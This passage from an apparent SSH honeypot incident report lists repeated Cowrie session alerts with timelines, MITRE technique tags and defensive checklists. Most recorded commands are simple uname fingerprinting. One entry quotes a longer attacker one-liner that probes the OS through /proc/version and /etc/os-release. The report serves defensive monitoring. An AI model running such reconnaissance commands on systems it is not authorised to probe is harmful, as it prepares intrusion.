| `2026-07-12 14:46:46` | `cowrie.log.closed` |
| `2026-07-12 14:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a19a398c59e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:49` | `cowrie.session.connect` |
| `2026-07-12 14:46:49` | `cowrie.client.version` |
| `2026-07-12 14:46:49` | `cowrie.client.kex` |
| `2026-07-12 14:46:50` | `cowrie.login.success` |
| `2026-07-12 14:46:52` | `cowrie.session.params` |
| `2026-07-12 14:46:52` | `cowrie.command.input` |
| `2026-07-12 14:46:52` | `cowrie.log.closed` |
| `2026-07-12 14:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfbe2b3b76bc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:46 |
| **Last Seen** | 2026-07-12 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:46:54` | `cowrie.session.connect` |
| `2026-07-12 14:46:54` | `cowrie.client.version` |
| `2026-07-12 14:46:55` | `cowrie.client.kex` |
| `2026-07-12 14:46:55` | `cowrie.login.success` |
| `2026-07-12 14:46:56` | `cowrie.session.params` |
| `2026-07-12 14:46:56` | `cowrie.command.input` |
| `2026-07-12 14:46:56` | `cowrie.log.closed` |
| `2026-07-12 14:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a369a520e0a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:00` | `cowrie.session.connect` |
| `2026-07-12 14:47:00` | `cowrie.client.version` |
| `2026-07-12 14:47:00` | `cowrie.client.kex` |
| `2026-07-12 14:47:01` | `cowrie.login.success` |
| `2026-07-12 14:47:02` | `cowrie.session.params` |
| `2026-07-12 14:47:02` | `cowrie.command.input` |
| `2026-07-12 14:47:02` | `cowrie.log.closed` |
| `2026-07-12 14:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b18af8430f4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:06` | `cowrie.session.connect` |
| `2026-07-12 14:47:06` | `cowrie.client.version` |
| `2026-07-12 14:47:06` | `cowrie.client.kex` |
| `2026-07-12 14:47:06` | `cowrie.login.success` |
| `2026-07-12 14:47:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c678d7c3d46

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:06` | `cowrie.session.connect` |
| `2026-07-12 14:47:06` | `cowrie.client.version` |
| `2026-07-12 14:47:06` | `cowrie.client.kex` |
| `2026-07-12 14:47:07` | `cowrie.login.success` |
| `2026-07-12 14:47:07` | `cowrie.session.params` |
| `2026-07-12 14:47:07` | `cowrie.command.input` |
| `2026-07-12 14:47:08` | `cowrie.log.closed` |
| `2026-07-12 14:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-094bdc632299

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:07` | `cowrie.session.connect` |
| `2026-07-12 14:47:07` | `cowrie.client.version` |
| `2026-07-12 14:47:07` | `cowrie.client.kex` |
| `2026-07-12 14:47:07` | `cowrie.login.success` |
| `2026-07-12 14:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f98d49714a1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:11` | `cowrie.session.connect` |
| `2026-07-12 14:47:11` | `cowrie.client.version` |
| `2026-07-12 14:47:11` | `cowrie.client.kex` |
| `2026-07-12 14:47:12` | `cowrie.login.success` |
| `2026-07-12 14:47:14` | `cowrie.session.params` |
| `2026-07-12 14:47:14` | `cowrie.command.input` |
| `2026-07-12 14:47:14` | `cowrie.log.closed` |
| `2026-07-12 14:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be92b0ca3ff3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:16` | `cowrie.session.connect` |
| `2026-07-12 14:47:16` | `cowrie.client.version` |
| `2026-07-12 14:47:17` | `cowrie.client.kex` |
| `2026-07-12 14:47:17` | `cowrie.login.success` |
| `2026-07-12 14:47:18` | `cowrie.session.params` |
| `2026-07-12 14:47:18` | `cowrie.command.input` |
| `2026-07-12 14:47:18` | `cowrie.log.closed` |
| `2026-07-12 14:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b439b7284d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:22` | `cowrie.session.connect` |
| `2026-07-12 14:47:22` | `cowrie.client.version` |
| `2026-07-12 14:47:22` | `cowrie.client.kex` |
| `2026-07-12 14:47:23` | `cowrie.login.success` |
| `2026-07-12 14:47:23` | `cowrie.session.params` |
| `2026-07-12 14:47:23` | `cowrie.command.input` |
| `2026-07-12 14:47:23` | `cowrie.log.closed` |
| `2026-07-12 14:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bad96b9b0cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:29` | `cowrie.session.connect` |
| `2026-07-12 14:47:29` | `cowrie.client.version` |
| `2026-07-12 14:47:29` | `cowrie.client.kex` |
| `2026-07-12 14:47:29` | `cowrie.login.success` |
| `2026-07-12 14:47:30` | `cowrie.session.params` |
| `2026-07-12 14:47:30` | `cowrie.command.input` |
| `2026-07-12 14:47:30` | `cowrie.log.closed` |
| `2026-07-12 14:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd3c4f069c0f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:35` | `cowrie.session.connect` |
| `2026-07-12 14:47:35` | `cowrie.client.version` |
| `2026-07-12 14:47:35` | `cowrie.client.kex` |
| `2026-07-12 14:47:36` | `cowrie.login.success` |
| `2026-07-12 14:47:37` | `cowrie.session.params` |
| `2026-07-12 14:47:37` | `cowrie.command.input` |
| `2026-07-12 14:47:37` | `cowrie.log.closed` |
| `2026-07-12 14:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-114f7b9f1a43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:41` | `cowrie.session.connect` |
| `2026-07-12 14:47:41` | `cowrie.client.version` |
| `2026-07-12 14:47:41` | `cowrie.client.kex` |
| `2026-07-12 14:47:42` | `cowrie.login.success` |
| `2026-07-12 14:47:43` | `cowrie.session.params` |
| `2026-07-12 14:47:43` | `cowrie.command.input` |
| `2026-07-12 14:47:43` | `cowrie.log.closed` |
| `2026-07-12 14:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17114d9eb55c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:47` | `cowrie.session.connect` |
| `2026-07-12 14:47:47` | `cowrie.client.version` |
| `2026-07-12 14:47:48` | `cowrie.client.kex` |
| `2026-07-12 14:47:48` | `cowrie.login.success` |
| `2026-07-12 14:47:49` | `cowrie.session.params` |
| `2026-07-12 14:47:49` | `cowrie.command.input` |
| `2026-07-12 14:47:49` | `cowrie.log.closed` |
| `2026-07-12 14:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64a1d200875c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:53` | `cowrie.session.connect` |
| `2026-07-12 14:47:53` | `cowrie.client.version` |
| `2026-07-12 14:47:53` | `cowrie.client.kex` |
| `2026-07-12 14:47:54` | `cowrie.login.success` |
| `2026-07-12 14:47:55` | `cowrie.session.params` |
| `2026-07-12 14:47:55` | `cowrie.command.input` |
| `2026-07-12 14:47:55` | `cowrie.log.closed` |
| `2026-07-12 14:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-730e40664344

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:47 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:47:59` | `cowrie.session.connect` |
| `2026-07-12 14:47:59` | `cowrie.client.version` |
| `2026-07-12 14:47:59` | `cowrie.client.kex` |
| `2026-07-12 14:48:00` | `cowrie.login.success` |
| `2026-07-12 14:48:01` | `cowrie.session.params` |
| `2026-07-12 14:48:01` | `cowrie.command.input` |
| `2026-07-12 14:48:01` | `cowrie.log.closed` |
| `2026-07-12 14:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10446a50cac6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:04` | `cowrie.session.connect` |
| `2026-07-12 14:48:04` | `cowrie.client.version` |
| `2026-07-12 14:48:04` | `cowrie.client.kex` |
| `2026-07-12 14:48:05` | `cowrie.login.success` |
| `2026-07-12 14:48:06` | `cowrie.session.params` |
| `2026-07-12 14:48:06` | `cowrie.command.input` |
| `2026-07-12 14:48:06` | `cowrie.log.closed` |
| `2026-07-12 14:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a308020ab8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:11` | `cowrie.session.connect` |
| `2026-07-12 14:48:11` | `cowrie.client.version` |
| `2026-07-12 14:48:11` | `cowrie.client.kex` |
| `2026-07-12 14:48:11` | `cowrie.login.success` |
| `2026-07-12 14:48:12` | `cowrie.session.params` |
| `2026-07-12 14:48:12` | `cowrie.command.input` |
| `2026-07-12 14:48:12` | `cowrie.log.closed` |
| `2026-07-12 14:48:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-639f14e15099

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:16` | `cowrie.session.connect` |
| `2026-07-12 14:48:16` | `cowrie.client.version` |
| `2026-07-12 14:48:16` | `cowrie.client.kex` |
| `2026-07-12 14:48:17` | `cowrie.login.success` |
| `2026-07-12 14:48:18` | `cowrie.session.params` |
| `2026-07-12 14:48:18` | `cowrie.command.input` |
| `2026-07-12 14:48:18` | `cowrie.log.closed` |
| `2026-07-12 14:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978e16102dfb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:22` | `cowrie.session.connect` |
| `2026-07-12 14:48:22` | `cowrie.client.version` |
| `2026-07-12 14:48:22` | `cowrie.client.kex` |
| `2026-07-12 14:48:23` | `cowrie.login.success` |
| `2026-07-12 14:48:23` | `cowrie.session.params` |
| `2026-07-12 14:48:23` | `cowrie.command.input` |
| `2026-07-12 14:48:24` | `cowrie.log.closed` |
| `2026-07-12 14:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76e6cdeb3a33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:28` | `cowrie.session.connect` |
| `2026-07-12 14:48:28` | `cowrie.client.version` |
| `2026-07-12 14:48:28` | `cowrie.client.kex` |
| `2026-07-12 14:48:29` | `cowrie.login.success` |
| `2026-07-12 14:48:30` | `cowrie.session.params` |
| `2026-07-12 14:48:30` | `cowrie.command.input` |
| `2026-07-12 14:48:30` | `cowrie.log.closed` |
| `2026-07-12 14:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-441669195e6f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:34` | `cowrie.session.connect` |
| `2026-07-12 14:48:34` | `cowrie.client.version` |
| `2026-07-12 14:48:34` | `cowrie.client.kex` |
| `2026-07-12 14:48:35` | `cowrie.login.success` |
| `2026-07-12 14:48:36` | `cowrie.session.params` |
| `2026-07-12 14:48:36` | `cowrie.command.input` |
| `2026-07-12 14:48:36` | `cowrie.log.closed` |
| `2026-07-12 14:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61a22bbfe11b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:40` | `cowrie.session.connect` |
| `2026-07-12 14:48:40` | `cowrie.client.version` |
| `2026-07-12 14:48:40` | `cowrie.client.kex` |
| `2026-07-12 14:48:41` | `cowrie.login.success` |
| `2026-07-12 14:48:42` | `cowrie.session.params` |
| `2026-07-12 14:48:42` | `cowrie.command.input` |
| `2026-07-12 14:48:42` | `cowrie.log.closed` |
| `2026-07-12 14:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f48f3be3077a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:46` | `cowrie.session.connect` |
| `2026-07-12 14:48:46` | `cowrie.client.version` |
| `2026-07-12 14:48:46` | `cowrie.client.kex` |
| `2026-07-12 14:48:47` | `cowrie.login.success` |
| `2026-07-12 14:48:47` | `cowrie.session.params` |
| `2026-07-12 14:48:47` | `cowrie.command.input` |
| `2026-07-12 14:48:47` | `cowrie.log.closed` |
| `2026-07-12 14:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7d959112430

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:50` | `cowrie.session.connect` |
| `2026-07-12 14:48:50` | `cowrie.client.version` |
| `2026-07-12 14:48:50` | `cowrie.client.kex` |
| `2026-07-12 14:48:51` | `cowrie.login.success` |
| `2026-07-12 14:48:52` | `cowrie.session.params` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.success` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.command.input` |
| `2026-07-12 14:48:52` | `cowrie.log.closed` |
| `2026-07-12 14:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-859d497ec054

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:52` | `cowrie.session.connect` |
| `2026-07-12 14:48:52` | `cowrie.client.version` |
| `2026-07-12 14:48:52` | `cowrie.client.kex` |
| `2026-07-12 14:48:53` | `cowrie.login.success` |
| `2026-07-12 14:48:54` | `cowrie.session.params` |
| `2026-07-12 14:48:54` | `cowrie.command.input` |
